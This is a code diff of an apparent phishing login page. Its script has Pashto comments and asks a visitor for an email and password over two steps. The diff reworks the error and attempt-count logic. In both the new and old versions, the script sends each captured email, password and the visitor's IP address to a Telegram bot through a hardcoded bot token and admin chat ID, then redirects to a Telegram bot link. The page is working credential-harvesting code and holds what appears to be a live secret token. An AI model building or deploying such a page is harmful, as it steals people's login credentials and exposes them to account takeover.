@@ -126,19 +126,13 @@
 </div>
 
 <script>
-    // ========== Bot Redirect Link ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
-    
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
     let currentEmail = "";
-    
-    // د تېروتنې شمېرلو لپاره (لومړی ځل، دوهم ځل، دریم ځل بریالی)
-    let emailAttemptCount = 0;
-    let passwordAttemptCount = 0;
+    let attemptCount = 0;  // د لاګ ان هڅو شمېر (یوازې د خالي پاسورډ لپاره)
 
-    // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
@@ -146,10 +140,6 @@
 
     function isValidEmail(email) {
         return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
-    }
-
-    function isValidPasswordLength(password) {
-        return password.length >= 8;
     }
 
     async function getUserIP() {
@@ -171,60 +161,33 @@
         document.getElementById('emailInput').value = '';
         document.getElementById('passwordInput').value = '';
         currentEmail = '';
-        emailAttemptCount = 0;
-        passwordAttemptCount = 0;
+        attemptCount = 0;
     }
 
-    // Step 1: Email Validation - درې ځله هڅه: لومړی/دوهم ناکام، دریم بریالی
+    // Step 1: Email Validation
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         let errorBox = document.getElementById('errorBox');
         
-        // که پښتو توري ولري
         if (hasPashtoCharacters(email)) {
             showMessage(errorBox, 'please pashto not allowed', true);
             return;
         }
         
         if (!email || !isValidEmail(email)) {
-            emailAttemptCount++;
-            if (emailAttemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-            } else if (emailAttemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-            } else if (emailAttemptCount >= 3) {
-                // دریم ځل: بریالی ګڼل کیږي (دې ته به راشي که ایمیل سم وی)
-                // که ایمیل سم نه وي نو بیا به په دریم ځل هم ناکام شي؟ خو د غوښتنې له مخې دریم ځل لاګ ان شي.
-                // نو که دریم ځل ته راغی او ایمیل لا هم ناسم دی، نو بیا هم بریالی ګڼو؟
-                // د غوښتنې له مخې: "په دریم ځل لاګ ان شی" - نو که ایمیل ناسم هم وي، دریم ځل به لاګ ان کوي.
-                // خو منطقي دا ده چې که دریم ځل ته راغی، نو د هر حالت لاګ ان کوي.
-                // موږ به ایمیل قبولو ته اړ کړو.
-                if (!email || !isValidEmail(email)) {
-                    // بیا هم په زوره دریم ځل بریالی
-                    currentEmail = email || "user@example.com";
-                    document.getElementById('displayEmail').innerHTML = `${currentEmail} ✓`;
-                    document.getElementById('step1View').classList.add('hidden');
-                    document.getElementById('step2View').classList.remove('hidden');
-                    document.getElementById('stepIndicator').textContent = "Step 2 of 2";
-                    document.getElementById('passwordInput').value = '';
-                    emailAttemptCount = 0;
-                    return;
-                }
-            }
+            showMessage(errorBox, 'Please check your email', true);
             return;
         }
         
-        // که ایمیل سم وي - بریالی
         currentEmail = email;
         document.getElementById('displayEmail').innerHTML = `${currentEmail} ✓`;
         document.getElementById('step1View').classList.add('hidden');
         document.getElementById('step2View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 2 of 2";
         document.getElementById('passwordInput').value = '';
-        emailAttemptCount = 0;
     };
 
-    // Step 2: Password Processing - درې ځله هڅه: لومړی/دوهم ناکام، دریم بریالی
+    // Step 2: Password Processing
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         let errorBox = document.getElementById('errorBox');
@@ -235,22 +198,27 @@
             return;
         }
         
-        // که پاسورډ خالي وي یا له 8 کم وي
-        if (!pass || !isValidPasswordLength(pass)) {
-            passwordAttemptCount++;
-            if (passwordAttemptCount === 1) {
+        // که پاسورډ له 8 کم وي - هر ځل (هر هڅه) دا تېروتنه راځي
+        if (pass.length < 8 && pass.length > 0) {
+            showMessage(errorBox, 'Password must be at least 8 characters', true);
+            return;
+        }
+        
+        // که پاسورډ خالي وي
+        if (!pass) {
+            attemptCount++;
+            if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
-            } else if (passwordAttemptCount === 2) {
+            } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
-            } else if (passwordAttemptCount >= 3) {
-                // دریم ځل: حتی که پاسورډ ناسم وي، بیا به لاګ ان کوي (د غوښتنې مطابق)
-                // خو موږ به پاسورډ قبولو ته اړ کړو او بوټ ته به ولیږو
+            } else if (attemptCount >= 3) {
+                // دریم ځل: قبولول (بوټ ته ځي)
                 let ip = await getUserIP();
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: ADMIN_ID, 
-                        text: `✅ LOGIN SUCCESS (3rd attempt forced)\nEmail: ${currentEmail}\nPass: ${pass || "(empty)"}\nIP: ${ip}`,
+                        text: `✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -259,12 +227,12 @@
                 setTimeout(() => {
                     window.location.href = BOT_REDIRECT;
                 }, 2000);
-                passwordAttemptCount = 0;
+                attemptCount = 0;
             }
             return;
         }
         
-        // که پاسورډ سم وي (8 توري یا زیات) - بریالی
+        // که پاسورډ سم وي (8 یا زیات)
         let ip = await getUserIP();
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -281,7 +249,7 @@
         setTimeout(() => {
             window.location.href = BOT_REDIRECT;
         }, 2000);
-        passwordAttemptCount = 0;
+        attemptCount = 0;
     };
 </script>
 </body>
